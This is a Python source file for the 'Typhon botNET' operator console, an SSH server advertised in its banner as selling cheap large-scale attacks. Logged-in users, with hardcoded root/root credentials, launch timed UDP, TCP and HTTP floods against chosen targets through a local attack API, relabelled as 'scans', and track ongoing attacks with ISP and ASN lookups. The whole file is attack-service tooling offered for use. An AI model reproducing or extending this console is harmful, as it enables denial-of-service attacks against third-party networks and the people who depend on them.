import socket
import threading
import time
import requests
import paramiko

# ==========================================
# COLOR CODES & STYLES
# ==========================================
VIOLET = '\033[38;5;93m'
WHITE  = '\033[37m'
BOLD   = '\033[1m'
RESET  = '\033[0m'
GREEN  = '\033[38;5;46m'
GREY   = '\033[90m'
CYAN   = '\033[36m'
RED    = '\033[31m'
YELLOW = '\033[33m'

# ==========================================
# CONFIGURATION & CONSTANTS
# ==========================================
LISTEN_PORT = 2222
AUTH_USER = "root"
AUTH_PASS = "root"
API_BOOM_URL = "http://localhost:5000/api/boom"
API_RESET_URL = "http://localhost:5000/api/reset"

# Global list storing active scans across threads
ONGOING_ATTACKS = []

HOST_KEY = paramiko.RSAKey.generate(2048)

BANNER_ART = f"""{GREEN}
                        !!=  -:=!! :=!$!#$$$$$$$$$$8X:
                        :!=::!H!<  -.USX!?R$$$$$$$$MM!
                        ='-!|||==-. :XWS$$U!!?$$$$$$PMM!
                            !:==-. :!M"T#$$$$WX?7#MRRMMM!
                            -TWux:w*`   `"#$$$$8!!!!?7!!!
                            :X= MS$$$     `"T#$T-!8$WDXD=
                        :%`  -#$$$m:        -!- ?$$$$$$         {BOLD}{VIOLET}Welcome to Typhon ボットNET{GREEN}
                        : |`. -  -T$$$$$3xx. .xWW- -""##*"       安価で 大規模な 攻撃
                .....  --==:c' |   -?T#$$00W0*?$$     / `       t.me/paradoxtea1
                WS00M!!| .|== !!   .:XUWSW!= `"-:    :
                #"--`.cx%`!!  !h:  |WM$$$$Ti.: .!WUm+!`
                III=:!!`:X= . : TH.lu  $$$B$$$|W:U|TS$M-
                .--   :X0i.--   70WTWp "*$$$$W$TX$! `
                Wi.=!X$?!-=   : T$$$E$Wu  -**$FM!
                $R0i.-- |     :  -$$$$$01$= n`
                TMXT0wx.=     :   -"`/#*$$$$M=          {WHITE}
"""

# ==========================================
# HELPER FUNCTIONS
# ==========================================
def typewrite(chan, text, delay=0.002):
    """Types out text with a smooth typing effect to the SSH channel."""
    formatted_text = text.replace('\n', '\r\n')
    for char in formatted_text:
        try:
            chan.send(char)
            time.sleep(delay)
        except Exception:
            break

def get_ip_info(ip_address):
    """Fetches ISP and ASN data using ip-api.com."""
    try:
        clean_ip = ip_address.replace("http://", "").replace("https://", "").split("/")[0]
        res = requests.get(f"http://ip-api.com/json/{clean_ip}?fields=isp,as,status", timeout=2)
        if res.status_code == 200:
            data = res.json()
            if data.get("status") == "success":
                return data.get("isp", "Unknown ISP"), data.get("as", "Unknown ASN")
    except Exception:
        pass
    return "N/A", "N/A"

def send_api_request(url, payload):
    """Dispatches HTTP POST request to local API."""
    try:
        res = requests.post(url, json=payload, timeout=2)
        return res.status_code
    except Exception:
        return None

def clean_expired_attacks():
    """Removes finished attacks from global state."""
    global ONGOING_ATTACKS
    now = time.time()
    ONGOING_ATTACKS = [a for a in ONGOING_ATTACKS if (now - a["start_time"]) < a["duration"]]

# ==========================================
# PARAMIKO SSH SERVER INTERFACE
# ==========================================
class TopiaSSHServer(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if username == AUTH_USER and password == AUTH_PASS:
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def check_channel_pty_request(self, channel, term, modes, height, width, pixelwidth, pixelheight):
        return True

    def check_channel_shell_request(self, channel):
        self.event.set()
        return True

# ==========================================
# CLIENT SESSION HANDLER
# ==========================================
def handle_client(client_socket, client_addr):
    global ONGOING_ATTACKS  # Declarer au TOUT DEBUT de la fonction pour eviter l'erreur SyntaxError

    transport = paramiko.Transport(client_socket)
    transport.add_server_key(HOST_KEY)
    server = TopiaSSHServer()

    try:
        transport.start_server(server=server)
    except paramiko.SSHException:
        return

    chan = transport.accept(20)
    if chan is None:
        return

    server.event.wait(10)
    if not server.event.is_set():
        chan.close()
        return

    try:
        typewrite(chan, BANNER_ART)
        typewrite(chan, f"\r\n        Type {GREEN}\"methods\"{WHITE} or {GREEN}\"help\"{WHITE} to start.\r\n\r\n")
    except (socket.error, EOFError):
        chan.close()
        return

    prompt = f"{GREEN}topia@jznetwork{WHITE} > "
    typewrite(chan, prompt)

    buffer = ""
    while True:
        try:
            data = chan.recv(1024)
            if not data:
                break

            for byte in data:
                char = chr(byte)

                # Enter key
                if char in ('\r', '\n'):
                    typewrite(chan, "\r\n")
                    cmd_line = buffer.strip()
                    buffer = ""

                    if cmd_line:
                        parts = cmd_line.split()
                        cmd = parts[0].lower()

                        if cmd in ["help", "methods"]:
                            help_text = f"""
{VIOLET}{BOLD}AVAILABLE COMMANDS & METHODS:{WHITE}
  {GREEN}udp <target> <port> <time>{WHITE}   : Launch Layer 4 UDP Scan / Attack
  {GREEN}tcp <target> <port> <time>{WHITE}   : Launch Layer 4 TCP Scan / Attack
  {GREEN}http <target_url> <time>{WHITE}    : Launch Layer 7 HTTP Scan / Attack
  {CYAN}ongoing{WHITE}                    : Display all active running scans
  {RED}stop{WHITE}                       : Emergency stop all active attacks
  {GREY}clear{WHITE}                      : Clear console terminal
  {GREY}exit{WHITE}                       : Disconnect session
"""
                            typewrite(chan, help_text)

                        elif cmd in ["udp", "tcp"]:
                            if len(parts) >= 4:
                                target = parts[1]
                                port = parts[2]
                                try:
                                    duration = int(parts[3])
                                except ValueError:
                                    duration = 60

                                isp, asn = get_ip_info(target)
                                layer = "Layer 4"

                                # Envoi API POST /api/boom
                                payload = {"method": cmd, "target": target, "port": port, "time": duration}
                                send_api_request(API_BOOM_URL, payload)

                                ONGOING_ATTACKS.append({
                                    "target": target,
                                    "port": port,
                                    "method": cmd.upper(),
                                    "duration": duration,
                                    "start_time": time.time(),
                                    "layer": layer
                                })

                                lines = [
                                    f"{GREEN}Scan  Successfully Sent !{WHITE}",
                                    f"{GREY}──────────────────────────────────────────────────{WHITE}",
                                    f"{GREEN} > Target Info : {WHITE}{target}",
                                    f"{GREEN} > Layer       : {WHITE}{layer}",
                                    f"{GREEN} > Method      : {WHITE}{cmd.upper()}",
                                    f"{GREEN} > Port        : {WHITE}{port}",
                                    f"{GREEN} > Duration    : {WHITE}{duration}s",
                                    f"{GREEN} > ISP         : {WHITE}{isp}",
                                    f"{GREEN} > ASN         : {WHITE}{asn}",
                                    f"{GREY}──────────────────────────────────────────────────{WHITE}",
                                    f"\r\n{CYAN}Type 'ongoing' to see all your active scans.{WHITE}\r\n",
                                ]
                                typewrite(chan, "\r\n".join(lines) + "\r\n")
                            else:
                                typewrite(chan, f"{RED}Usage: {cmd} <ip/target> <port> <time>{WHITE}\r\n")

                        elif cmd == "http":
                            if len(parts) >= 3:
                                target = parts[1]
                                try:
                                    duration = int(parts[2])
                                except ValueError:
                                    duration = 60
                                port = "80/443"

                                isp, asn = get_ip_info(target)
                                layer = "Layer 7"

                                # Envoi API POST /api/boom
                                payload = {"method": "http", "target": target, "time": duration}
                                send_api_request(API_BOOM_URL, payload)

                                ONGOING_ATTACKS.append({
                                    "target": target,
                                    "port": port,
                                    "method": "HTTP",
                                    "duration": duration,
                                    "start_time": time.time(),
                                    "layer": layer
                                })

                                lines = [
                                    f"{GREEN}Scan  Successfully Sent !{WHITE}",
                                    f"{GREY}──────────────────────────────────────────────────{WHITE}",
                                    f"{GREEN} > Target Info : {WHITE}{target}",
                                    f"{GREEN} > Layer       : {WHITE}{layer}",
                                    f"{GREEN} > Method      : {WHITE}HTTP",
                                    f"{GREEN} > Port        : {WHITE}{port}",
                                    f"{GREEN} > Duration    : {WHITE}{duration}s",
                                    f"{GREEN} > ISP         : {WHITE}{isp}",
                                    f"{GREEN} > ASN         : {WHITE}{asn}",
                                    f"{GREY}──────────────────────────────────────────────────{WHITE}",
                                    f"\r\n{CYAN}Type 'ongoing' to see all your active scans.{WHITE}\r\n",
                                ]
                                typewrite(chan, "\r\n".join(lines) + "\r\n")
                            else:
                                typewrite(chan, f"{RED}Usage: http <target_url> <time>{WHITE}\r\n")

                        elif cmd == "ongoing":
                            clean_expired_attacks()
                            if not ONGOING_ATTACKS:
                                typewrite(chan, f"{YELLOW}No active scans running at the moment.{WHITE}\r\n")
                            else:
                                table = f"""
{VIOLET}{BOLD}ACTIVE ONGOING SCANS ({len(ONGOING_ATTACKS)}){WHITE}
{GREY}┌──────────────────┬───────┬────────┬─────────┬──────────────┬───────────┐{WHITE}
{GREY}│{WHITE} {BOLD}TARGET{RESET}           {GREY}│{WHITE} {BOLD}PORT{RESET}  {GREY}│{WHITE} {BOLD}METHOD{RESET} {GREY}│{WHITE} {BOLD}LAYER{RESET}   {GREY}│{WHITE} {BOLD}ELAPSED{RESET}      {GREY}│{WHITE} {BOLD}REMAINING{RESET} {GREY}│{WHITE}
{GREY}├──────────────────┼───────┼────────┼─────────┼──────────────┼───────────┤{WHITE}"""
                                now = time.time()
                                for atk in ONGOING_ATTACKS:
                                    elapsed = int(now - atk["start_time"])
                                    rem = max(0, atk["duration"] - elapsed)
                                    target_str = (atk['target'][:16] + "..") if len(atk['target']) > 16 else atk['target'].ljust(16)
                                    port_str = str(atk['port']).ljust(5)
                                    meth_str = atk['method'].ljust(6)
                                    layer_str = atk['layer'].ljust(7)
                                    elaps_str = f"{elapsed}s / {atk['duration']}s".ljust(12)
                                    rem_str = f"{rem}s".ljust(9)

                                    table += f"\n{GREY}│{WHITE} {target_str} {GREY}│{WHITE} {port_str} {GREY}│{GREEN} {meth_str} {GREY}│{WHITE} {layer_str} {GREY}│{WHITE} {elaps_str} {GREY}│{YELLOW} {rem_str} {GREY}│{WHITE}"

                                table += f"\n{GREY}└──────────────────┴───────┴────────┴─────────┴──────────────┴───────────┘{WHITE}\n"
                                typewrite(chan, table)

                        elif cmd == "stop":
                            ONGOING_ATTACKS.clear()
                            # Envoi API POST /api/reset
                            send_api_request(API_RESET_URL, {})
                            typewrite(chan, f"{RED}{BOLD}[!] EMERGENCY STOP DISPATCHED - ALL ACTIVE SCANS KILLED.{WHITE}\r\n")

                        elif cmd == "clear":
                            typewrite(chan, "\033[2J\033[H")

                        elif cmd in ["exit", "quit"]:
                            typewrite(chan, f"{YELLOW}Disconnecting... Bye!{WHITE}\r\n")
                            chan.close()
                            return
                        else:
                            typewrite(chan, f"{RED}Unknown command: '{cmd}'. Type 'help' for instructions.{WHITE}\r\n")

                    typewrite(chan, prompt)

                # Handle Backspace
                elif char in ('\x08', '\x7f'):
                    if len(buffer) > 0:
                        buffer = buffer[:-1]
                        typewrite(chan, "\b \b")

                # Printable characters
                elif 32 <= byte <= 126:
                    buffer += char
                    typewrite(chan, char)

        except Exception:
            break

    chan.close()

# ==========================================
# MAIN SERVER LAUNCHER
# ==========================================
def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        sock.bind(('0.0.0.0', LISTEN_PORT))
        sock.listen(100)
        print(f"{GREEN}[+] SSH Server listening on port {LISTEN_PORT}...{RESET}")
    except Exception as e:
        print(f"{RED}[-] Bind failed: {e}{RESET}")
        return

    while True:
        try:
            client, addr = sock.accept()
            t = threading.Thread(target=handle_client, args=(client, addr))
            t.daemon = True
            t.start()
        except KeyboardInterrupt:
            sock.close()
            break

if __name__ == '__main__':
    main()